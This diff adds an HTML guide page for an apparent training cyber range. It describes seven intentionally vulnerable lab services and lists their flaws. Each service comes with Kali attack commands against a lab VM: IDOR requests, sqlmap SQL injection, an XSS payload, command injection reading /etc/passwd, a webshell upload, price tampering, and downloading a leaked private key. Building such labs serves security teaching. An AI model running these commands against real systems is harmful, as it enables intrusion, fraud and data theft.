@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Interactive Microservices Guide | Dadiwoo Cyber Range</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- Navigation Header -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="brand">🛡 Dadiwoo Cyber Range</a>
+            <div class="nav-links">
+                <a href="index.html#overview">Overview</a>
+                <a href="index.html#hosted">Services Catalog</a>
+                <a href="index.html#wireshark">Wireshark & Kali</a>
+                <a href="index.html" class="btn-nav">← Back to Main Docs</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container" style="padding-top: 40px; padding-bottom: 80px;">
+        <span class="badge-hero">INTERACTIVE GUIDE v1.0.0</span>
+        <h1 class="section-title" style="text-align: left; margin-top: 12px;">⚡ Microservice Interactive Usage & Attack Guide</h1>
+        <p class="section-subtitle" style="text-align: left; margin: 0 0 32px 0;">Click on any microservice below to launch an interactive popup modal displaying detailed usage, OWASP vulnerabilities, API endpoints, and Kali Linux penetration commands.</p>
+
+        <!-- Microservices Interactive Grid -->
+        <div class="ms-grid">
+
+            <!-- ATM Lab Card -->
+            <div class="ms-card" onclick="openModal('atm')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🏧 ATM Transaction Lab</h3>
+                    <span class="port-tag">8080</span>
+                </div>
+                <p class="ms-card-desc">Simulates ATM web UI, balance operations, withdrawals, and transfers with IDOR/BOLA and negative number logic flaws.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- Bank Lab Card -->
+            <div class="ms-card" onclick="openModal('bank')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🏦 Online Banking Portal</h3>
+                    <span class="port-tag">8081</span>
+                </div>
+                <p class="ms-card-desc">Full banking platform featuring user registration, wire transfers, search SQL Injection, and Reflected XSS.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- ISP Lab Card -->
+            <div class="ms-card" onclick="openModal('isp')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🌐 ISP Customer Portal</h3>
+                    <span class="port-tag">8082</span>
+                </div>
+                <p class="ms-card-desc">Customer management portal integrated with simulated RADIUS subscriber metrics and Command Injection diagnostic tools.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- Student Lab Card -->
+            <div class="ms-card" onclick="openModal('school')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🎓 Student University Portal</h3>
+                    <span class="port-tag">8083</span>
+                </div>
+                <p class="ms-card-desc">Academic transcript lookup, grade modification, and document uploads with registrar IDOR and arbitrary file upload flaws.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- Shop Lab Card -->
+            <div class="ms-card" onclick="openModal('shop')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🛒 E-Commerce Platform</h3>
+                    <span class="port-tag">8084</span>
+                </div>
+                <p class="ms-card-desc">Online store featuring catalog browsing, client-side price tampering, coupon reuse logic flaws, and receipt IDOR.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- Mobile Lab Card -->
+            <div class="ms-card" onclick="openModal('mobile')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">📱 Smartphone & Bluetooth Simulator</h3>
+                    <span class="port-tag">8085</span>
+                </div>
+                <p class="ms-card-desc">Simulates Bluetooth discoverability, BlueBorne contact exfiltration endpoints, and weak pairing PINs (`0000`).</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+            <!-- Wave Chat Lab Card -->
+            <div class="ms-card" onclick="openModal('wave')">
+                <div class="ms-card-header">
+                    <h3 class="ms-card-title">🌊 Wave Chat Social Media</h3>
+                    <span class="port-tag">8086</span>
+                </div>
+                <p class="ms-card-desc">Social media platform for OSINT reconnaissance, profile intelligence, multi-photo asset compression (~1-30 KB), and SSL/TLS cert decryption.</p>
+                <span class="ms-card-action">View Usage & Attack Popup →</span>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- MODAL POPUP OVERLAY -->
+    <div id="modalOverlay" class="modal-overlay" onclick="closeModalOnBackdrop(event)">
+        <div class="modal-box">
+            <button class="modal-close" onclick="closeModal()">×</button>
+            <div id="modalContent">
+                <!-- Dynamically populated by JS -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const labData = {
+            atm: {
+                title: "🏧 Dadiwoo ATM Transaction Processing Lab",
+                port: "8080",
+                domain: "atm.lab:8080",
+                category: "Financial / Banking",
+                stack: "FastAPI, SQLite 3, Jinja2, HTML5",
+                overview: "Simulates an automated teller machine web UI and REST API. Introduces students to Insecure Direct Object References (IDOR/BOLA) and logic flaws.",
+                usage: [
+                    "1. Access the web interface at http://atm.lab:8080 or http://localhost:8080.",
+                    "2. Authenticate using sample account ACC-1001 and PIN 1234.",
+                    "3. Test deposit, withdrawal, and account transfer forms."
+                ],
+                flaws: [
+                    "IDOR / BOLA: Change target account parameter in GET /api/v1/accounts/ACC-9000 to exfiltrate administrative records.",
+                    "Negative Withdrawal Logic Flaw: Submit negative withdrawal amounts (-500) to artificially inflate account balances."
+                ],
+                kali: [
+                    "curl -s http://<VM_IP>:8080/api/v1/accounts/ACC-9000",
+                    "curl -X POST http://<VM_IP>:8080/withdraw -d 'account_id=ACC-1001&amount=-1000'"
+                ]
+            },
+            bank: {
+                title: "🏦 Dadiwoo Online Banking Portal Lab",
+                port: "8081",
+                domain: "bank.lab:8081",
+                category: "Financial / Web Security",
+                stack: "FastAPI, SQLite 3, HTML5",
+                overview: "Full enterprise online banking platform featuring user registration, wire transfers, transaction search, and SQL Injection vulnerabilities.",
+                usage: [
+                    "1. Access http://bank.lab:8081.",
+                    "2. Register a test bank account or log in with user1 / pin 1234.",
+                    "3. Execute wire transfers and search transaction histories."
+                ],
+                flaws: [
+                    "SQL Injection: Search query parameter 'q' is vulnerable to union-based and boolean-based SQLi.",
+                    "Reflected XSS: Search result rendering unescaped user input in browser context."
+                ],
+                kali: [
+                    "sqlmap -u 'http://<VM_IP>:8081/?q=Allowance' --cookie='session_user=user1' --batch --dbs",
+                    "curl -s 'http://<VM_IP>:8081/?q=<script>alert(1)</script>'"
+                ]
+            },
+            isp: {
+                title: "🌐 Dadiwoo ISP Customer Management Portal",
+                port: "8082",
+                domain: "isp.lab:8082",
+                category: "Telecom / Network Diagnostics",
+                stack: "FastAPI, SQLite 3, Ping Subprocess",
+                overview: "Customer portal integrated with RADIUS subscriber metrics and network ping diagnostic tools vulnerable to Command Injection.",
+                usage: [
+                    "1. Open http://isp.lab:8082 in your browser.",
+                    "2. Navigate to Network Diagnostics section.",
+                    "3. Enter an IP address (e.g., 127.0.0.1) to ping host connectivity."
+                ],
+                flaws: [
+                    "Command Injection: Diagnostic host parameter accepts shell metacharacters (; | && `) executing arbitrary commands."
+                ],
+                kali: [
+                    "curl -X POST http://<VM_IP>:8082/diagnostics -d 'host=127.0.0.1; id; cat /etc/passwd'",
+                    "curl -X POST http://<VM_IP>:8082/diagnostics -d 'host=127.0.0.1; uname -a'"
+                ]
+            },
+            school: {
+                title: "🎓 Dadiwoo University Student Portal",
+                port: "8083",
+                domain: "school.lab:8083",
+                category: "Education / Academic Records",
+                stack: "FastAPI, SQLite 3, File Storage",
+                overview: "Academic portal for grade lookup, fee payment, and document upload with insecure file upload flaws and transcript IDOR.",
+                usage: [
+                    "1. Access http://school.lab:8083.",
+                    "2. Log in with Student ID STD-1001 and PIN 1234.",
+                    "3. View academic transcripts and upload document files."
+                ],
+                flaws: [
+                    "Transcript IDOR: Query student ID parameter to inspect registrar account STD-9000.",
+                    "Arbitrary File Upload: Upload executable webshells or non-document scripts in beginner mode."
+                ],
+                kali: [
+                    "curl -s http://<VM_IP>:8083/api/v1/students/STD-9000",
+                    "curl -F 'file=@shell.py' http://<VM_IP>:8083/upload"
+                ]
+            },
+            shop: {
+                title: "🛒 Dadiwoo E-Commerce Platform Lab",
+                port: "8084",
+                domain: "shop.lab:8084",
+                category: "Retail / Business Logic",
+                stack: "FastAPI, SQLite 3, HTML5",
+                overview: "Online store featuring catalog browsing, coupon logic flaws, client price tampering, and order lookup IDOR.",
+                usage: [
+                    "1. Open http://shop.lab:8084.",
+                    "2. Browse catalog items and add products to cart.",
+                    "3. Proceed to checkout and test promotional coupon codes."
+                ],
+                flaws: [
+                    "Client Price Tampering: Intercept POST /checkout request and modify price parameter to 0.01.",
+                    "Coupon Logic Reuse Flaw: Apply promotional discount coupons repeatedly without single-use validation."
+                ],
+                kali: [
+                    "curl -X POST http://<VM_IP>:8084/checkout -d 'product_id=1&price=0.01&coupon=DISCOUNT20'",
+                    "curl -s http://<VM_IP>:8084/api/v1/orders/ORD-1001"
+                ]
+            },
+            mobile: {
+                title: "📱 Dadiwoo Smartphone & Bluetooth Simulator",
+                port: "8085",
+                domain: "mobile.lab:8085",
+                category: "Mobile / Wireless Security",
+                stack: "FastAPI, SQLite 3, JSON API",
+                overview: "Simulates smartphone Bluetooth discoverability, contact exfiltration endpoints, BlueBorne flaws, and weak pairing PINs.",
+                usage: [
+                    "1. Access http://mobile.lab:8085.",
+                    "2. View discoverable Bluetooth devices and pairing status.",
+                    "3. Test pairing with default PIN 0000 or query exfiltration endpoints."
+                ],
+                flaws: [
+                    "Unauthenticated Contact Exfiltration: Endpoint /api/v1/bluetooth/exfiltrate returns entire phonebook without auth.",
+                    "Weak Bluetooth Pairing PIN: Hardcoded weak PIN '0000' allows unauthorized device pairing."
+                ],
+                kali: [
+                    "curl -s http://<VM_IP>:8085/api/v1/bluetooth/exfiltrate",
+                    "curl -X POST http://<VM_IP>:8085/bluetooth/pair -d 'attacker_mac=00:11:22:33:44:55&pin=0000'"
+                ]
+            },
+            wave: {
+                title: "🌊 Wave Chat Social Media Platform Lab",
+                port: "8086",
+                domain: "wave.lab:8086",
+                category: "Social Media / OSINT & Cryptography",
+                stack: "FastAPI, SQLite 3, Pillow Image Processing",
+                overview: "Fake social media platform for OSINT profile reconnaissance, multi-photo asset compression (~1-30 KB), and Let's Encrypt SSL/TLS certificate decryption.",
+                usage: [
+                    "1. Open http://wave.lab:8086.",
+                    "2. Register a social account with profile details or search OSINT targets (alex_ceo).",
+                    "3. Create posts with up to 10+ photos (compressed to tiny KB sizes).",
+                    "4. Visit /certificate to inspect SSL/TLS certs and download leaked private keys."
+                ],
+                flaws: [
+                    "OSINT Reconnaissance: Target profiles reveal confidential corporate contact details, phone numbers, and flags.",
+                    "Leaked Let's Encrypt Staging Certificate: In beginner mode, download leaked private key (key.pem) to passively decrypt user PCAPs in Wireshark."
+                ],
+                kali: [
+                    "curl -s http://<VM_IP>:8086/api/v1/users/alex_ceo",
+                    "curl -s http://<VM_IP>:8086/api/v1/certificate",
+                    "curl -s http://<VM_IP>:8086/certificate/download/key.pem -o key.pem",
+                    "openssl x509 -in cert.pem -text -noout"
+                ]
+            }
+        };
+
+        function openModal(labKey) {
+            const lab = labData[labKey];
+            if (!lab) return;
+
+            let flawsHtml = lab.flaws.map(f => `<li>${f}</li>`).join("");
+            let usageHtml = lab.usage.map(u => `<li>${u}</li>`).join("");
+            let kaliHtml = lab.kali.map(k => `<div class="code-block">${k}</div>`).join("");
+
+            document.getElementById("modalContent").innerHTML = `
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:16px;">
+                    <div>
+                        <h2 style="margin:0; font-size:1.5rem; color:white;">${lab.title}</h2>
+                        <div style="color:#38bdf8; font-weight:bold; font-size:0.9rem; margin-top:4px;">Domain: ${lab.domain} | Category: ${lab.category}</div>
+                    </div>
+                    <span class="port-tag" style="font-size:1rem; padding:4px 12px;">Port ${lab.port}</span>
+                </div>
+
+                <div class="guide-box">
+                    <h4 style="color:#38bdf8; margin-top:0;">📋 Overview & Objectives</h4>
+                    <p style="color:#94a3b8; margin-0;">${lab.overview}</p>
+                    <p style="color:#94a3b8; font-size:0.85rem; margin-top:8px;"><strong>Tech Stack:</strong> ${lab.stack}</p>
+                </div>
+
+                <div class="guide-box">
+                    <h4 style="color:#38bdf8; margin-top:0;">🚀 How To Use</h4>
+                    <ul style="color:#f8fafc; padding-left:20px; margin:0;">${usageHtml}</ul>
+                </div>
+
+                <div class="guide-box">
+                    <h4 style="color:#ef4444; margin-top:0;">⚠️ OWASP Vulnerabilities & Flaws</h4>
+                    <ul style="color:#fecaca; padding-left:20px; margin:0;">${flawsHtml}</ul>
+                </div>
+
+                <div class="guide-box">
+                    <h4 style="color:#38bdf8; margin-top:0;">🐉 Kali Linux & Wireshark Penetration Commands</h4>
+                    ${kaliHtml}
+                </div>
+            `;
+
+            document.getElementById("modalOverlay").classList.add("active");
+        }
+
+        function closeModal() {
+            document.getElementById("modalOverlay").classList.remove("active");
+        }
+
+        function closeModalOnBackdrop(event) {
+            if (event.target.id === "modalOverlay") {
+                closeModal();
+            }
+        }
+
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "Escape") {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
